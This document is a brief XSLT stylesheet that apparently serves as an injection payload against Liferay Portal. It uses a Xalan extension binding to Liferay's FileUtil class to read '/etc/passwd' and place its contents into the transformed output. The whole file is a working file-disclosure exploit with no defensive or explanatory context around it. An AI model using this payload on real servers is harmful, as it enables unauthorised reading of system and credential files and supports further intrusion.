<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
        <xsl:template match="/">
                <pre>
                        <xsl:value-of xmlns:fileUtil="xalan://com.liferay.portal.kernel.util.FileUtil" select="fileUtil:read('/etc/passwd')" />
                </pre>
        </xsl:template>
</xsl:stylesheet>
